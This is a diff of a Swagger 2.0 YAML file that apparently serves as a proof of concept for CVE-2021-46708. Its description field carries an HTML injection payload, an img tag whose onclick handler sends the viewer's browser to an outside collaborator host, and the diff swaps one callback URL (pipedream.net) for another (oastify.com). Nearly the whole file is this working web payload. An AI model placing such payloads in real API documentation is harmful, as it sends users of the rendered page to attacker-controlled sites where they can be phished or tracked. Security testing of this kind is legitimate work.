@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title:  CVE-2021-46708 onliclick action redirect any site
-  description: <img src=x onclick='document.location.href ="https://en9o08ao3dxas.x.pipedream.net";'>
+  description: <img src=x onclick='document.location.href ="https://ub9wld2ixsucltvz2tykpi1krbx2lu9j.oastify.com";'>
 paths:
   /accounts:
     get:
